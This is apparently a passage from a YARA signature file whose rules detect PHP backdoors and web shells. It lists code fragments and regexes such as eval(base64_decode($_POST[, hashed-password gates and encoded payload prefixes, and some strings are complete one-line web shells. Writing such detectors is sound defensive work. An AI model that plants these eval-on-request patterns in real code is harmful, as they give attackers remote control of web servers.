rule php_backdoor_eval_GET_011 : backdoor
{
    strings:
        $trigger = "eval(stripslashes($_GET["
    condition:
        $trigger and PR01771 and PR01772
}

private rule PR01773 : trigger
{
    strings:
        $ps0 = "<?php if($_GET[_"
    condition:
        $ps0
}

private rule PR01774 : trigger
{
    strings:
        $ps0 = "))if($GLOBALS['_"
    condition:
        $ps0
}

private rule PR01775 : trigger
{
    strings:
        $ps0 = ")])== _"
    condition:
        $ps0
}

rule php_backdoor_eval_GET_012 : backdoor
{
    strings:
        $trigger = "]($_GET[_"
    condition:
        $trigger and PR01773 and PR01774 and PR01775
}

private rule PR01776 : trigger
{
    strings:
        $ps0 = "\"\\x63\\x72\\x65\\x61\\x74\\x65\\x5f\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\""
    condition:
        $ps0
}

rule php_backdoor_eval_GET_013 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR01776
}

private rule PR01777 : trigger
{
    strings:
        $ps0 = "=$_GET;if($"
    condition:
        $ps0
}

private rule PR01778 : trigger
{
    strings:
        $ps0 = "<?$"
    condition:
        $ps0
}

private rule PR01779 : trigger
{
    strings:
        $ps0 = "]); eval('?>'.file_get_contents($"
    condition:
        $ps0
}

rule php_backdoor_eval_GET_014 : backdoor
{
    strings:
        $trigger = "]!=null)$"
    condition:
        $trigger and PR01777 and PR01778 and PR01779
}

private rule PR01780 : trigger
{
    strings:
        $ps0 = "if(isset($_GET["
    condition:
        $ps0
}

rule php_backdoor_eval_GET_015 : backdoor
{
    strings:
        $trigger = "if(strtoupper(md5($_GET['pw']))!='FFC52A7AEF7B90A27C1FBAEC516A4F0E'){"
    condition:
        $trigger and PR01780
}

rule php_backdoor_eval_get_option_002 : backdoor
{
    strings:
        $trigger = "<?php eval(get_option(\"\\x"
    condition:
        $trigger
}

private rule PR01781 : trigger
{
    strings:
        $ps0 = "function wp_custom_page_links_return"
    condition:
        $ps0
}

rule php_backdoor_eval_get_option_003 : backdoor
{
    strings:
        $trigger = "_option"
    condition:
        $trigger and PR01781
}

private rule PR01782 : trigger
{
    strings:
        $ps0 = "if(isset(${$"
    condition:
        $ps0
}

rule php_backdoor_eval_isset_001 : backdoor
{
    strings:
        $trigger = "eval(${$"
    condition:
        $trigger and PR01782 and PR01016
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_isset_002 : backdoor
{
    strings:
        $trigger = "if(isset($_"
        $php_backdoor_eval_isset_002_r0 = /if\(isset\(\$_(REQUEST|POST|GET)\[[^\]]+\]\)[\s]*&&[\s]*\(md5\(\$_(REQUEST|POST|GET)\[[^]]+\]\)[\s]*==[\s]*['\"][\w]{25,}['\"]\)[^}]+eval[^}]+}/
    condition:
        $trigger and PR00732 and PR01550 and $php_backdoor_eval_isset_002_r0
}

private rule PR01783 : trigger
{
    strings:
        $ps0 = "if(isset($_GET"
    condition:
        $ps0
}

rule php_backdoor_eval_isset_003 : backdoor
{
    strings:
        $trigger = "PD9waHAKCiRmaWxlcyA9IEAkX0ZJTEVTWyJ"
    condition:
        $trigger and PR01783
}

rule php_backdoor_eval_isset_004 : backdoor
{
    strings:
        $trigger = "option_name`='s_encrypted_data"
    condition:
        $trigger and PR01654 and PR01771 and PR00397
}

rule php_backdoor_eval_isset_005 : backdoor
{
    strings:
        $trigger = "PD9waHAgJHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFceDRjXHg"
    condition:
        $trigger and PR01783
}

private rule PR01784 : trigger
{
    strings:
        $ps0 = "\";${\"G"
    condition:
        $ps0
}

rule php_backdoor_eval_isset_006 : backdoor
{
    strings:
        $trigger = "eval(${$"
    condition:
        $trigger and PR01784 and PR00634 and PR01016
}

rule php_backdoor_eval_POST_001 : backdoor
{
    strings:
        $trigger = "@create_function ( ' ', str_rot13 ( 'riny( $_CBFG"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_002_002 : backdoor
{
    strings:
        $trigger = "if(isset($_POST['eval']))"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_002_004 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(str_rot13(strrev("
    condition:
        $trigger
}

rule php_backdoor_eval_POST_002_005 : backdoor
{
    strings:
        $trigger = "eval($_POST['wp-load']);"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_002_006 : backdoor
{
    strings:
        $trigger = "eval(stripslashes(@$_POST"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_002_007 : backdoor
{
    strings:
        $trigger = "@$thor($hamm);"
    condition:
        $trigger and PR00507
}

private rule PR01785 : trigger
{
    strings:
        $ps0 = "if(md5($_POST"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_008 : backdoor
{
    strings:
        $trigger = "eval(base64_decode($_POST["
    condition:
        $trigger and PR01785
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_002_03 : backdoor
{
    strings:
        $trigger = "POST"
        $php_backdoor_eval_POST_002_03_r0 = /eval\(base64_decode\(@?\$_POST\[/
        $php_backdoor_eval_POST_002_03_r1 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_POST_002_03_r0 and $php_backdoor_eval_POST_002_03_r1
}

private rule PR01786 : trigger
{
    strings:
        $ps0 = "base64_decode($_POST[\"php\"]"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_08 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR01786
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_002_09 : backdoor
{
    strings:
        $trigger = "error_reporting(0); set_time_limit(0); if ($_GET"
        $php_backdoor_eval_POST_002_09_r0 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR00507 and PR01398 and $php_backdoor_eval_POST_002_09_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_002_10 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
        $php_backdoor_eval_POST_002_10_r0 = /eval\(base64_decode\(@?\$_POST\[/
        $php_backdoor_eval_POST_002_10_r1 = /if[\s]*\([\s]*isset[\s]*\([\s]*\$_POST\[[^\]]+\][\s]*\)[\s]*\)[\s]*eval/
    condition:
        $trigger and PR00507 and $php_backdoor_eval_POST_002_10_r0 and $php_backdoor_eval_POST_002_10_r1
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_002_11 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
        $php_backdoor_eval_POST_002_11_r0 = /eval\(base64_decode\(@?\$_POST\[/
        $php_backdoor_eval_POST_002_11_r1 = /if[\s]*\([\s]*isset[\s]*\([\s]*\$_POST\[[^\]]+\][\s]*\)[\s]*\)[\s]*\{[\s]*eval/
    condition:
        $trigger and PR00507 and $php_backdoor_eval_POST_002_11_r0 and $php_backdoor_eval_POST_002_11_r1
}

// MANUAL FIX NECESSARY
private rule PR01787 : trigger
{
    strings:
        $ps0 = "@ini_set(\"memory_limit\", \"128M\");"
    condition:
        $ps0
}

private rule PR01788 : trigger
{
    strings:
        $ps0 = "exit;"
    condition:
        $ps0
}

private rule PR01789 : trigger
{
    strings:
        $ps0 = "@error_reporting(0);"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_12 : backdoor
{
    strings:
        $trigger = "@ini_set(\"log_errors\",0);"
        $php_backdoor_eval_POST_002_12_r0 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR01787 and PR01788 and PR01789 and PR00507 and PR01398 and $php_backdoor_eval_POST_002_12_r0
}

// MANUAL FIX NECESSARY
private rule PR01790 : trigger
{
    strings:
        $ps0 = "pass\"]==$_passssword)"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_13 : backdoor
{
    strings:
        $trigger = "@ini_get(\"safe_mode\"),"
        $php_backdoor_eval_POST_002_13_r0 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR01790 and PR00507 and PR01398 and $php_backdoor_eval_POST_002_13_r0
}

// MANUAL FIX NECESSARY
private rule PR01791 : trigger
{
    strings:
        $ps0 = "@flock($fp, LOCK_EX); @fputs($fp, $_SERVER["
    condition:
        $ps0
}

private rule PR01792 : trigger
{
    strings:
        $ps0 = "!== false) { print $_SERVER["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_14 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
        $php_backdoor_eval_POST_002_14_r0 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR01791 and PR00507 and PR01792 and $php_backdoor_eval_POST_002_14_r0
}

// MANUAL FIX NECESSARY
private rule PR01793 : trigger
{
    strings:
        $ps0 = "exit;}"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_15 : backdoor
{
    strings:
        $trigger = "if ($_POST[\"php\"])"
        $php_backdoor_eval_POST_002_15_r0 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR01793 and PR01398 and $php_backdoor_eval_POST_002_15_r0
}

// MANUAL FIX NECESSARY
private rule PR01794 : trigger
{
    strings:
        $ps0 = "=== $hash) @eval(base64"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_16 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
        $php_backdoor_eval_POST_002_16_r0 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR01794 and PR00507 and $php_backdoor_eval_POST_002_16_r0
}

// MANUAL FIX NECESSARY
private rule PR01795 : trigger
{
    strings:
        $ps0 = "die(eval(base64_decode($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_17 : backdoor
{
    strings:
        $trigger = "(md5(md5($_POST"
        $php_backdoor_eval_POST_002_17_r0 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR01795 and $php_backdoor_eval_POST_002_17_r0
}

// MANUAL FIX NECESSARY
private rule PR01796 : trigger
{
    strings:
        $ps0 = "if(md5($_GET["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_18 : backdoor
{
    strings:
        $trigger = "=='1'){echo '200'; exit;}"
        $php_backdoor_eval_POST_002_18_r0 = /eval\(base64_decode\(@?\$_POST\[/
    condition:
        $trigger and PR00507 and PR01796 and PR01398 and $php_backdoor_eval_POST_002_18_r0
}

private rule PR01797 : trigger
{
    strings:
        $ps0 = "(preg_match('/^HTTP\\/1[.][01] 404/Usi', $header)) header($header);"
    condition:
        $ps0
}

private rule PR01798 : trigger
{
    strings:
        $ps0 = "$host ="
    condition:
        $ps0
}

rule php_backdoor_eval_POST_002_19 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR01797 and PR01798 and PR01422
}

rule php_backdoor_eval_POST_003 : backdoor
{
    strings:
        $trigger = "preg_replace($_POST['v1'], $_POST['v2'], $_POST['v3']);"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_004 : backdoor
{
    strings:
        $trigger = "str_replace(\" \",\"\",\"\\x65\\x76"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_007 : backdoor
{
    strings:
        $trigger = "\"])){eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256,\""
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_008_03 : backdoor
{
    strings:
        $trigger = "die("
        $php_backdoor_eval_POST_008_03_r0 = /if \(.isset\(\$_POST\[.(\w+).\]\)\)\s*\{die/
    condition:
        $trigger and PR01490 and $php_backdoor_eval_POST_008_03_r0
}

private rule PR01799 : trigger
{
    strings:
        $ps0 = "GLOBALS"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_011 : backdoor
{
    strings:
        $trigger = "GLOBAL $alreadyxxx;"
    condition:
        $trigger and PR01799
}

rule php_backdoor_eval_POST_013 : backdoor
{
    strings:
        $trigger = "if(!empty($_POST['tp2']) and isset($_POST['tp2'])){"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_014 : backdoor
{
    strings:
        $trigger = "$_=@((base64_decode($_POST["
    condition:
        $trigger
}

rule php_backdoor_eval_POST_015 : backdoor
{
    strings:
        $trigger = "$x0b=$_POST[\"inp\"];"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_016 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"BcFJkqowAA"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_017 : backdoor
{
    strings:
        $trigger = "newfilecontents = preg_replace('#<\\?php /\\*startdel"
    condition:
        $trigger
}

private rule PR01800 : trigger
{
    strings:
        $ps0 = "ZWNobyAnJzs="
    condition:
        $ps0
}

rule php_backdoor_eval_POST_018 : backdoor
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR01800
}

// MANUAL FIX NECESSARY
private rule PR01801 : trigger
{
    strings:
        $ps0 = "eval(stripslashes($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_019 : backdoor
{
    strings:
        $trigger = "exit"
        $php_backdoor_eval_POST_019_r0 = /<\?php[\s]*if[\s]*\(isset.._POST\[.[\w]+.\]\)\)[\s]*\{[\s]*@?eval\(stripslashes\(\$_POST\[.[\w]+.\]\)\);[\s]*exit\(?\)?;[\s]*\};?[\s]*\?>/
    condition:
        $trigger and PR01369 and PR01801 and $php_backdoor_eval_POST_019_r0
}

rule php_backdoor_eval_POST_021 : backdoor
{
    strings:
        $trigger = "@preg_replace(\"/[checksql]/e\",$_POST['date'],\"saft\"); "
    condition:
        $trigger
}

rule php_backdoor_eval_POST_022 : backdoor
{
    strings:
        $trigger = "<?php @eval($_POST[http]);?>"
    condition:
        $trigger
}

private rule PR01802 : trigger
{
    strings:
        $ps0 = "preg_replace(\"\\x23\\50\\x2e\\53\\x29\\43\\x69\\145\","
    condition:
        $ps0
}

rule php_backdoor_eval_POST_023 : backdoor
{
    strings:
        $trigger = "cookey"
    condition:
        $trigger and PR01802
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_024 : backdoor
{
    strings:
        $trigger = "strtoupper($"
        $php_backdoor_eval_POST_024_r0 = /\$s[\d]+=strto(lower|upper)\(\$..\[[\d]+\]\.[^\n]+eval\(\$/
    condition:
        $trigger and PR01350 and $php_backdoor_eval_POST_024_r0
}

rule php_backdoor_eval_POST_025 : backdoor
{
    strings:
        $trigger = "{echo '<textarea id=areatext>';eval("
    condition:
        $trigger and PR01746
}

rule php_backdoor_eval_POST_026 : backdoor
{
    strings:
        $trigger = "$_POST[\"pass\"]==$_passssword"
    condition:
        $trigger and PR00029
}

rule php_backdoor_eval_POST_026_001 : backdoor
{
    strings:
        $trigger = "$auss = \""
    condition:
        $trigger and PR00029 and PR00507
}

rule php_backdoor_eval_POST_027 : backdoor
{
    strings:
        $trigger = "if (isset($_POST['wp-loads'])) {"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_028 : backdoor
{
    strings:
        $trigger = "eva"
        $php_backdoor_eval_POST_028_r0 = /<\?php[\s]*@?eval/
        $php_backdoor_eval_POST_028_r1 = /<\?php[\s]*@?eval[\s]*\([\s]*\$_POST[^\)]*\);?([\s]*\?>)?/
    condition:
        $trigger and $php_backdoor_eval_POST_028_r0 and $php_backdoor_eval_POST_028_r1
}

rule php_backdoor_eval_POST_029 : backdoor
{
    strings:
        $trigger = "if (!isset($_POST['url']) && !isset($_POST['timeout'])) {header('HTTP/1.1 404 Not Found');echo"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_030 : backdoor
{
    strings:
        $trigger = "eval(eval(\"\\$_"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_031 : backdoor
{
    strings:
        $trigger = "if( md5($names[0])!='"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_032 : backdoor
{
    strings:
        $trigger = "JGxvZyA9ICdwcnQnOyBpZiAoIWlzc2V0KCRfU0VTU0lPTi"
    condition:
        $trigger and PR00719
}

rule php_backdoor_eval_POST_033 : backdoor
{
    strings:
        $trigger = "echo \"good_check_thumb\";"
    condition:
        $trigger and PR00732
}

rule php_backdoor_eval_POST_034 : backdoor
{
    strings:
        $trigger = "if($_POST['hsh']=='"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_035 : backdoor
{
    strings:
        $trigger = "));exit;}if(isset($_GET[sesion])){phpinfo()"
    condition:
        $trigger and PR00029 and PR00507
}

private rule PR01803 : trigger
{
    strings:
        $ps0 = "echo @$GLOBALS[$GLOBALS["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_037 : backdoor
{
    strings:
        $trigger = "].$GLOBALS["
    condition:
        $trigger and PR01803 and PR00719
}

rule php_backdoor_eval_POST_038 : backdoor
{
    strings:
        $trigger = "$_POST; @($p[0] != $p[1]) ? @$p[2]($p[3])"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_039 : backdoor
{
    strings:
        $trigger = "<?php @eval($_POST["
    condition:
        $trigger
}

rule php_backdoor_eval_POST_040 : backdoor
{
    strings:
        $trigger = "404 Not Found'); exit(); }else{ $s=\"p\".\"r\".\"e\".\"g"
    condition:
        $trigger
}

private rule PR01804 : trigger
{
    strings:
        $ps0 = "&& md5($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_041 : backdoor
{
    strings:
        $trigger = "error_reporting(0);if(isset($_REQUEST"
    condition:
        $trigger and PR00029 and PR01422 and PR01804
}

rule php_backdoor_eval_POST_042 : backdoor
{
    strings:
        $trigger = "error_reporting(0);eval(\"if(isset(\\$_REQUEST"
    condition:
        $trigger
}

private rule PR01805 : trigger
{
    strings:
        $ps0 = "if(@copy(@urldecode($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_043 : backdoor
{
    strings:
        $trigger = "if(@isset($_POST["
    condition:
        $trigger and PR01805
}

private rule PR01806 : trigger
{
    strings:
        $ps0 = "if(@isset($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_044 : backdoor
{
    strings:
        $trigger = "@preg_replace('/(.*)/e', @str_replace"
    condition:
        $trigger and PR01806
}

rule php_backdoor_eval_POST_045 : backdoor
{
    strings:
        $trigger = "$xsser=base64_decode($_POST["
    condition:
        $trigger and PR00029
}

private rule PR01807 : trigger
{
    strings:
        $ps0 = "stripslashes($_POST[\"php"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_047 : backdoor
{
    strings:
        $trigger = "{@$_POST[\"php_func\"](stripslashes"
    condition:
        $trigger and PR01807 and PR01490
}

private rule PR01808 : trigger
{
    strings:
        $ps0 = "{@eval(stripslashes($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_047_02 : backdoor
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR01808 and PR01807
}

private rule PR01809 : trigger
{
    strings:
        $ps0 = "])&($config=chr("
    condition:
        $ps0
}

rule php_backdoor_eval_POST_048 : backdoor
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR01809
}

rule php_backdoor_eval_POST_049 : backdoor
{
    strings:
        $trigger = "@eval(\"\\$getnum = $uid;\");"
    condition:
        $trigger
}

private rule PR01810 : trigger
{
    strings:
        $ps0 = ");}elseif(is_string($"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_050 : backdoor
{
    strings:
        $trigger = ";}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map(\""
    condition:
        $trigger and PR00029 and PR01810 and PR01422
}

private rule PR01811 : trigger
{
    strings:
        $ps0 = "= base64_decode($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_051 : backdoor
{
    strings:
        $trigger = "eval($"
    condition:
        $trigger and PR01369 and PR01811
}

rule php_backdoor_eval_POST_052 : backdoor
{
    strings:
        $trigger = "eval(stripslashes(array_"
    condition:
        $trigger and PR00507
}

rule php_backdoor_eval_POST_053 : backdoor
{
    strings:
        $trigger = "@eval(\"\\$getnum = $host;\");"
    condition:
        $trigger and PR00507
}

private rule PR01812 : trigger
{
    strings:
        $ps0 = "echo \"indata_error\";"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_054 : backdoor
{
    strings:
        $trigger = "eval($"
    condition:
        $trigger and PR01812 and PR01811
}

private rule PR01813 : trigger
{
    strings:
        $ps0 = "switch($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_055 : backdoor
{
    strings:
        $trigger = "eval($"
    condition:
        $trigger and PR01813 and PR01811
}

private rule PR01814 : trigger
{
    strings:
        $ps0 = "'@'"
    condition:
        $ps0
}

private rule PR01815 : trigger
{
    strings:
        $ps0 = "'/ad/e'"
    condition:
        $ps0
}

private rule PR01816 : trigger
{
    strings:
        $ps0 = "'add'"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_056 : backdoor
{
    strings:
        $trigger = "&& @preg_replace"
    condition:
        $trigger and PR01814 and PR00507 and PR01815 and PR01816
}

private rule PR01817 : trigger
{
    strings:
        $ps0 = "<?php if(isset($_"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_056_02 : backdoor
{
    strings:
        $trigger = "'add'"
    condition:
        $trigger and PR01817 and PR01814 and PR00507 and PR01815
}

private rule PR01818 : trigger
{
    strings:
        $ps0 = "preg_"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_057 : backdoor
{
    strings:
        $trigger = "e\",base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9T"
    condition:
        $trigger and PR01818
}

private rule PR01819 : trigger
{
    strings:
        $ps0 = "echo '"
    condition:
        $ps0
}

private rule PR01820 : trigger
{
    strings:
        $ps0 = "if($_GET['"
    condition:
        $ps0
}

private rule PR01821 : trigger
{
    strings:
        $ps0 = "@eval($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_058 : backdoor
{
    strings:
        $trigger = "] == 'c'){"
    condition:
        $trigger and PR01819 and PR01820 and PR01821
}

private rule PR01822 : trigger
{
    strings:
        $ps0 = "!empty($_GET[$"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_058_02 : backdoor
{
    strings:
        $trigger = ")=='c')"
    condition:
        $trigger and PR01819 and PR01821 and PR01822
}

private rule PR01823 : trigger
{
    strings:
        $ps0 = "extends Mage_Core_Controller_Front_Action"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_059 : backdoor
{
    strings:
        $trigger = "@eval($_POST["
    condition:
        $trigger and PR01823
}

private rule PR01824 : trigger
{
    strings:
        $ps0 = "/e\",$_GET["
    condition:
        $ps0
}

private rule PR01825 : trigger
{
    strings:
        $ps0 = "=eval($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_060 : backdoor
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR01824 and PR01825
}

private rule PR01826 : trigger
{
    strings:
        $ps0 = "']); } $GLOBALS['"
    condition:
        $ps0
}

private rule PR01827 : trigger
{
    strings:
        $ps0 = "\";$GLOBALS['"
    condition:
        $ps0
}

private rule PR01828 : trigger
{
    strings:
        $ps0 = "'])) { eval($GLOBALS['"
    condition:
        $ps0
}

private rule PR01829 : trigger
{
    strings:
        $ps0 = "]); echo $"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_061 : backdoor
{
    strings:
        $trigger = "'] = ${$"
    condition:
        $trigger and PR01826 and PR01827 and PR01828 and PR01829
}

private rule PR01830 : trigger
{
    strings:
        $ps0 = "=call_user_func($"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_062 : backdoor
{
    strings:
        $trigger = "],$"
    condition:
        $trigger and PR01350 and PR01830 and PR01016
}

private rule PR01831 : trigger
{
    strings:
        $ps0 = "aWYobWQ1KCRfQ09PS0lF"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_064 : backdoor
{
    strings:
        $trigger = "YXNlNjRfZGVjb2RlKCRfUE9TVFs"
    condition:
        $trigger and PR00029 and PR01831 and PR01422 and PR01748
}

rule php_backdoor_eval_POST_065 : backdoor
{
    strings:
        $trigger = ");}echo2($_POST["
    condition:
        $trigger and PR00029
}

private rule PR01832 : trigger
{
    strings:
        $ps0 = "if(!@$_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_067 : backdoor
{
    strings:
        $trigger = "])){eval(base64_decode(str_replace(chr("
    condition:
        $trigger and PR01832
}

private rule PR01833 : trigger
{
    strings:
        $ps0 = ";foreach(array"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_067_02 : backdoor
{
    strings:
        $trigger = "])){eval(base64_decode(str_replace(chr("
    condition:
        $trigger and PR01833
}

private rule PR01834 : trigger
{
    strings:
        $ps0 = "e\";"
    condition:
        $ps0
}

private rule PR01835 : trigger
{
    strings:
        $ps0 = "!empty($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_068 : backdoor
{
    strings:
        $trigger = "$version ="
    condition:
        $trigger and PR01410 and PR01834 and PR01835
}

private rule PR01836 : trigger
{
    strings:
        $ps0 = "if (isset($_POST[\"code\"]))"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_069 : backdoor
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR01789 and PR01836
}

private rule PR01837 : trigger
{
    strings:
        $ps0 = "ror_reporting"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_070 : backdoor
{
    strings:
        $trigger = ";$_='create'.'_'.'function';$__=$_"
    condition:
        $trigger and PR01837
}

private rule PR01838 : trigger
{
    strings:
        $ps0 = "eval(rawurldecode(base64_decode($_POST"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_071 : backdoor
{
    strings:
        $trigger = "])&&(md5($_POST["
    condition:
        $trigger and PR01838
}

private rule PR01839 : trigger
{
    strings:
        $ps0 = "if(isset($HTTP_POST_VARS) && isset($HTTP_POST_VARS["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_072 : backdoor
{
    strings:
        $trigger = "eval(pack('H*', $HTTP_POST_VARS["
    condition:
        $trigger and PR01839
}

private rule PR01840 : trigger
{
    strings:
        $ps0 = "=str_rot13(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_073 : backdoor
{
    strings:
        $trigger = "] = chr(ord($"
    condition:
        $trigger and PR01840 and PR00029
}

private rule PR01841 : trigger
{
    strings:
        $ps0 = "@preg_replace('/^/e','e'.'val(base64"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_074 : backdoor
{
    strings:
        $trigger = "base64_decode($_POST["
    condition:
        $trigger and PR01841
}

private rule PR01842 : trigger
{
    strings:
        $ps0 = "*/$_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_075 : backdoor
{
    strings:
        $trigger = "eval/*"
    condition:
        $trigger and PR01842
}

private rule PR01843 : trigger
{
    strings:
        $ps0 = "*/(get_option("
    condition:
        $ps0
}

rule php_backdoor_eval_POST_075_02 : backdoor
{
    strings:
        $trigger = "eval/*"
    condition:
        $trigger and PR01843
}

private rule PR01844 : trigger
{
    strings:
        $ps0 = "echo $a.$b.$c"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_076 : backdoor
{
    strings:
        $trigger = "=fopen($_SERVER['DOCUMENT_ROOT'].\""
    condition:
        $trigger and PR01844 and PR00029 and PR00507
}

private rule PR01845 : trigger
{
    strings:
        $ps0 = "XSk7ZXhpdCgpO30=';eval(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_078 : backdoor
{
    strings:
        $trigger = "));exit();"
    condition:
        $trigger and PR01845 and PR01414
}

private rule PR01846 : trigger
{
    strings:
        $ps0 = "ZXZhbChiYXNlNjRfZGVjb2RlKGFycmF5X3NoaWZ0KGFycmF5X3ZhbHVlcygk"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_079 : backdoor
{
    strings:
        $trigger = "ror_reporting"
    condition:
        $trigger and PR01846
}

rule php_backdoor_eval_POST_080 : backdoor
{
    strings:
        $trigger = "$prefix = $var('',$types($set_prefix));$prefix();"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_081 : backdoor
{
    strings:
        $trigger = "base64_decode($_POST[\"mysql_sync\"])"
    condition:
        $trigger and PR00029
}

rule php_backdoor_eval_POST_082 : backdoor
{
    strings:
        $trigger = "c3RyaXBzbGFzaGVzKGJhc2U2NF9kZWNvZGUoJF9QT1NU"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR01847 : trigger
{
    strings:
        $ps0 = "eval (get_magic_quotes_gpc()==1?stripslashes($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_083 : backdoor
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR01847
}

rule php_backdoor_eval_POST_084 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(base64_decode($_POST["
    condition:
        $trigger
}

private rule PR01848 : trigger
{
    strings:
        $ps0 = "print"
    condition:
        $ps0
}

private rule PR01849 : trigger
{
    strings:
        $ps0 = "YmFzZTY0X2RlY29kZShhcnJheV9zaGlmdCgk"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_085 : backdoor
{
    strings:
        $trigger = "^ ord($_"
    condition:
        $trigger and PR01848 and PR01849
}

rule php_backdoor_eval_POST_086 : backdoor
{
    strings:
        $trigger = "JyAuIGdldGN3ZCgpIC4gJzwvY3dkPic7IH0gaWYgKCBpc3NldCAoICR"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR01850 : trigger
{
    strings:
        $ps0 = "echo 'wo cao hao niu bi';"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_087 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR01850
}

rule php_backdoor_eval_POST_088 : backdoor
{
    strings:
        $trigger = "7X1te9s2suh3/QqY1QZiItGSnHSzkinbTZxN7uZtY2fbXttHpSRKYi2RKkn5pa7/+50ZACT4JsvZ7t7nPs/dnhOLwGAAD"
    condition:
        $trigger and PR00029 and PR01436
}

rule php_backdoor_eval_POST_089 : backdoor
{
    strings:
